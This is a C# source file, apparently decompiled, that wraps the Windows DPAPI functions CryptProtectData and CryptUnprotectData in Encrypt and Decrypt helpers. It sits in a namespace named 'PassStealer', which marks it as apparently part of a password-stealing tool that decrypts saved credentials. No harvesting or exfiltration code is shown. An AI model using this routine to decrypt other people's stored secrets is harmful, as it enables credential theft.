using System;
using System.Runtime.InteropServices;
using System.Text;

namespace PassStealer
{
	public class DPAPI
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct DATA_BLOB
		{
			public int cbData;

			public IntPtr pbData;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct CRYPTPROTECT_PROMPTSTRUCT
		{
			public int cbSize;

			public int dwPromptFlags;

			public IntPtr hwndApp;

			public string szPrompt;
		}

		public enum KeyType
		{
			UserKey = 1,
			MachineKey
		}

		private const int CRYPTPROTECT_UI_FORBIDDEN = 1;

		private const int CRYPTPROTECT_LOCAL_MACHINE = 4;

		private static IntPtr NullPtr = (IntPtr)0;

		private static DPAPI.KeyType defaultKeyType = DPAPI.KeyType.UserKey;

		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptProtectData(ref DPAPI.DATA_BLOB pPlainText, string szDescription, ref DPAPI.DATA_BLOB pEntropy, IntPtr pReserved, ref DPAPI.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DPAPI.DATA_BLOB pCipherText);

		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DPAPI.DATA_BLOB pCipherText, ref string pszDescription, ref DPAPI.DATA_BLOB pEntropy, IntPtr pReserved, ref DPAPI.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DPAPI.DATA_BLOB pPlainText);

		private static void InitPrompt(ref DPAPI.CRYPTPROTECT_PROMPTSTRUCT ps)
		{
			ps.cbSize = Marshal.SizeOf(typeof(DPAPI.CRYPTPROTECT_PROMPTSTRUCT));
			ps.dwPromptFlags = 0;
			ps.hwndApp = DPAPI.NullPtr;
			ps.szPrompt = null;
		}

		private static void InitBLOB(byte[] data, ref DPAPI.DATA_BLOB blob)
		{
			if (data == null)
			{
				data = new byte[0];
			}
			blob.pbData = Marshal.AllocHGlobal(data.Length);
			if (blob.pbData == IntPtr.Zero)
			{
				throw new Exception("Unable to allocate data buffer for BLOB structure.");
			}
			blob.cbData = data.Length;
			Marshal.Copy(data, 0, blob.pbData, data.Length);
		}

		public static string Encrypt(string plainText)
		{
			return DPAPI.Encrypt(DPAPI.defaultKeyType, plainText, string.Empty, string.Empty);
		}

		public static string Encrypt(DPAPI.KeyType keyType, string plainText)
		{
			return DPAPI.Encrypt(keyType, plainText, string.Empty, string.Empty);
		}

		public static string Encrypt(DPAPI.KeyType keyType, string plainText, string entropy)
		{
			return DPAPI.Encrypt(keyType, plainText, entropy, string.Empty);
		}

		public static string Encrypt(DPAPI.KeyType keyType, string plainText, string entropy, string description)
		{
			if (plainText == null)
			{
				plainText = string.Empty;
			}
			if (entropy == null)
			{
				entropy = string.Empty;
			}
			return Convert.ToBase64String(DPAPI.Encrypt(keyType, Encoding.UTF8.GetBytes(plainText), Encoding.UTF8.GetBytes(entropy), description));
		}

		public static byte[] Encrypt(DPAPI.KeyType keyType, byte[] plainTextBytes, byte[] entropyBytes, string description)
		{
			if (plainTextBytes == null)
			{
				plainTextBytes = new byte[0];
			}
			if (entropyBytes == null)
			{
				entropyBytes = new byte[0];
			}
			if (description == null)
			{
				description = string.Empty;
			}
			DPAPI.DATA_BLOB dATA_BLOB = default(DPAPI.DATA_BLOB);
			DPAPI.DATA_BLOB dATA_BLOB2 = default(DPAPI.DATA_BLOB);
			DPAPI.DATA_BLOB dATA_BLOB3 = default(DPAPI.DATA_BLOB);
			DPAPI.CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(DPAPI.CRYPTPROTECT_PROMPTSTRUCT);
			DPAPI.InitPrompt(ref cRYPTPROTECT_PROMPTSTRUCT);
			byte[] result;
			try
			{
				try
				{
					DPAPI.InitBLOB(plainTextBytes, ref dATA_BLOB);
				}
				catch (Exception innerException)
				{
					throw new Exception("Cannot initialize plaintext BLOB.", innerException);
				}
				try
				{
					DPAPI.InitBLOB(entropyBytes, ref dATA_BLOB3);
				}
				catch (Exception innerException2)
				{
					throw new Exception("Cannot initialize entropy BLOB.", innerException2);
				}
				int num = 1;
				if (keyType == DPAPI.KeyType.MachineKey)
				{
					num |= 4;
				}
				if (!DPAPI.CryptProtectData(ref dATA_BLOB, description, ref dATA_BLOB3, IntPtr.Zero, ref cRYPTPROTECT_PROMPTSTRUCT, num, ref dATA_BLOB2))
				{
					Marshal.GetLastWin32Error();
				}
				byte[] array = new byte[dATA_BLOB2.cbData];
				Marshal.Copy(dATA_BLOB2.pbData, array, 0, dATA_BLOB2.cbData);
				result = array;
			}
			catch (Exception innerException3)
			{
				throw new Exception("DPAPI was unable to encrypt data.", innerException3);
			}
			finally
			{
				if (dATA_BLOB.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB.pbData);
				}
				if (dATA_BLOB2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB2.pbData);
				}
				if (dATA_BLOB3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB3.pbData);
				}
			}
			return result;
		}

		public static string Decrypt(string cipherText)
		{
			string text;
			return DPAPI.Decrypt(cipherText, string.Empty, out text);
		}

		public static string Decrypt(string cipherText, out string description)
		{
			return DPAPI.Decrypt(cipherText, string.Empty, out description);
		}

		public static string Decrypt(string cipherText, string entropy, out string description)
		{
			if (entropy == null)
			{
				entropy = string.Empty;
			}
			return Encoding.UTF8.GetString(DPAPI.Decrypt(Convert.FromBase64String(cipherText), Encoding.UTF8.GetBytes(entropy), out description));
		}

		public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
		{
			DPAPI.DATA_BLOB dATA_BLOB = default(DPAPI.DATA_BLOB);
			DPAPI.DATA_BLOB dATA_BLOB2 = default(DPAPI.DATA_BLOB);
			DPAPI.DATA_BLOB dATA_BLOB3 = default(DPAPI.DATA_BLOB);
			DPAPI.CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(DPAPI.CRYPTPROTECT_PROMPTSTRUCT);
			DPAPI.InitPrompt(ref cRYPTPROTECT_PROMPTSTRUCT);
			description = string.Empty;
			byte[] result;
			try
			{
				try
				{
					DPAPI.InitBLOB(cipherTextBytes, ref dATA_BLOB2);
				}
				catch (Exception innerException)
				{
					throw new Exception("Cannot initialize ciphertext BLOB.", innerException);
				}
				try
				{
					DPAPI.InitBLOB(entropyBytes, ref dATA_BLOB3);
				}
				catch (Exception innerException2)
				{
					throw new Exception("Cannot initialize entropy BLOB.", innerException2);
				}
				int dwFlags = 1;
				if (!DPAPI.CryptUnprotectData(ref dATA_BLOB2, ref description, ref dATA_BLOB3, IntPtr.Zero, ref cRYPTPROTECT_PROMPTSTRUCT, dwFlags, ref dATA_BLOB))
				{
					Marshal.GetLastWin32Error();
				}
				byte[] array = new byte[dATA_BLOB.cbData];
				Marshal.Copy(dATA_BLOB.pbData, array, 0, dATA_BLOB.cbData);
				result = array;
			}
			catch (Exception innerException3)
			{
				throw new Exception("DPAPI was unable to decrypt data.", innerException3);
			}
			finally
			{
				if (dATA_BLOB.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB.pbData);
				}
				if (dATA_BLOB2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB2.pbData);
				}
				if (dATA_BLOB3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dATA_BLOB3.pbData);
				}
			}
			return result;
		}
	}
}
